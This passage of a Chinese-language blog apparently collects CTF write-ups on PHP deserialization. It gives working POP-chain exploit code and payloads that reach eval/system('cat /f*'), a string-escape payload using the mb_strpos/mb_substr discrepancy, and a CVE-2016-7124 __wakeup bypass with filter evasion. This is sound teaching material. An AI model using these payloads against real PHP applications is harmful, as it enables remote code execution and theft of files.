class="hljs-string">&#x27;&#125;&#125;&#125;&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\[|\]/i&quot;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NONONO!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$pre</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;substr&#x27;</span>]:<span class="hljs-string">&quot;substr&quot;</span>;<br>    <span class="hljs-variable">$ser_ctf</span> = <span class="hljs-title function_ invoke__">substrstr</span>(<span class="hljs-variable">$pre</span>.<span class="hljs-string">&quot;[&quot;</span>.<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>).<span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser_ctf</span>);<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;杂鱼~杂鱼~&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>本题综合性很强，考察php反序列化，GC回收，引用赋值，字符串逃逸，特殊变量名传参</p><p>先写出pop链</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">destruct</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">toString</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">call</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">get</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">isset</span>-&gt;</span>invoke<br></code></pre></td></tr></table></figure><p>这里需要用注意到__wakeup中对end进行了赋值，需要用引用赋值绕过它</p><p>后面还有一个异常抛出，使得<code>__destruct</code>并不能触发，这时就需要使用gc回收的机制，使<code>__destruct</code>提前触发，让<code>pop</code>链能够往后走</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__toString&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__call&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__get&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__isset&quot;</span>;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;__invoke&quot;</span>;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>();<br><span class="hljs-variable">$a</span>-&gt;end = &amp;<span class="hljs-variable">$a</span>-&gt;username;<br><span class="hljs-variable">$a</span>-&gt;start = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">T</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">F</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">E</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">R</span>();<br><span class="hljs-variable">$a</span>-&gt;start-&gt;c-&gt;t-&gt;f-&gt;e-&gt;r = <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>修改一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>接下来是字符串逃逸</p><p>题目正常序列化 <code>serialize($ctf)</code>，得到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">227</span>:<span class="hljs-string">&quot;&#123;&#123;&#123;a:2:&#123;s:1:&quot;</span>a<span class="hljs-string">&quot;;O:6:&quot;</span>Hacke<span class="hljs-string">r&quot;:3:&#123;s:5:&quot;</span>start<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;O:1:&quot;</span>T<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>t<span class="hljs-string">&quot;;O:1:&quot;</span>F<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;O:1:&quot;</span>E<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>e<span class="hljs-string">&quot;;O:1:&quot;</span>R<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">r&quot;;s:18:&quot;</span>system(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="hljs-string">&quot;;s:6:&quot;</span>hacke<span class="hljs-string">r&quot;;s:8:&quot;</span>username<span class="hljs-string">&quot;;R:9;&#125;s:1:&quot;</span>a<span class="hljs-string">&quot;;N;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>O:6:”Hacker”:3:{s:5:”start”;s:227:”{ { {是没有用的，后面不用管</p><p>利用<a href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strpos与mb_substr执行差异导致的漏洞</a>把前面没用的部分截掉</p><p>payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">substr</span>=<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0abc<span class="hljs-variable">%f</span>0<span class="hljs-variable">%9fab</span>&amp;ez[ser.from_you=a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>1.还可以利用fast destruct逃脱异常</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">203</span>:<span class="hljs-string">&quot;&#123;&#123;&#123;O:6:&quot;</span>Hacke<span class="hljs-string">r&quot;:3:&#123;s:5:&quot;</span>start<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;O:1:&quot;</span>T<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>t<span class="hljs-string">&quot;;O:1:&quot;</span>F<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;O:1:&quot;</span>E<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>e<span class="hljs-string">&quot;;O:1:&quot;</span>R<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">r&quot;;s:18:&quot;</span>system(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="hljs-string">&quot;;s:6:&quot;</span>hacke<span class="hljs-string">r&quot;;s:8:&quot;</span>username<span class="hljs-string">&quot;;R:8;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>删去末尾的四个}}}}来破坏序列化字符串结构，利用fast destruct逃脱异常</p><p>2.mb_strpos与mb_substr执行差异</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">每发送一个<span class="hljs-variable">%f0abc</span>，mb_strpos认为是<span class="hljs-number">4</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">3</span>个字节<br>每发送一个<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>fab<span class="hljs-punctuation">,</span>mb_strpos认为是<span class="hljs-number">3</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">2</span>个字节<br>每发送一个<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%9</span>fa<span class="hljs-punctuation">,</span>mb_strpos认为是<span class="hljs-number">2</span>个字节，mb_substr认为是<span class="hljs-number">1</span>个字节，相差<span class="hljs-number">1</span>个字节<br></code></pre></td></tr></table></figure><h3 id="4-3-攻防世界-Web-php-unserialize"><a href="#4-3-攻防世界-Web-php-unserialize" class="headerlink" title="4.3 [攻防世界]Web_php_unserialize"></a>4.3 [攻防世界]Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>本题的pop链十分简单，直接利用Demo读取fl4g.php即可，但需要利用cve-2016-7124绕过__wakeup，以及处理好private字段。</p><p>接下来是绕过过滤，正则表达式匹配的模式是O:和C:，只需要替换成O+:和C+: 即可</p><p>最后再进行base64编码</p><p>但是直接把结果丢进工具里编码并不成功，查询资料得知这里的file变量为私有变量，所以序列化之后的字符串开头结 尾各有一个空白字符（即%00），字符串长度也比实际长度大2，如果将序列化结 果复制到在线的base64网站进行编码可能就会丢掉空白字符，所以这里直接在 php 代码里进行编码。类似的还有protected类型的变量，序列化之后字符串首 部会加上%00*%00。 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;fl4g.php&quot;</span>);<br><span class="hljs-comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1:&#123;&#x27;</span>,<span class="hljs-string">&#x27;2:&#123;&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><h3 id="4-4-BUUCTF-UnserializeOne"><a href="#4-4-BUUCTF-UnserializeOne" class="headerlink" title="4.4 [BUUCTF]UnserializeOne"></a>4.4 [BUUCTF]UnserializeOne</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 